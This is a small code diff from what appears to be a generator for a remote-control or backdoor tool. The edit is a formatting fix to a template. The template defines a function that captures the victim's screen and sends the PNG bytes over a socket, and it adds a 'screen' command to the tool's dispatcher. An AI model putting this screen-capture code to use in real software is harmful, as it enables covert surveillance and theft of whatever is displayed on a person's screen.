@@ -13,8 +13,7 @@ def screen_shot():
         monitor = sct.monitors[1]
         im = sct.grab(monitor)
         raw_bytes = mss.tools.to_png(im.rgb, im.size)
-        s.sendall(raw_bytes)
-''')
+        s.sendall(raw_bytes)''')
         config.logics.append('''
             elif command == "screen":
                 screen_shot()''')
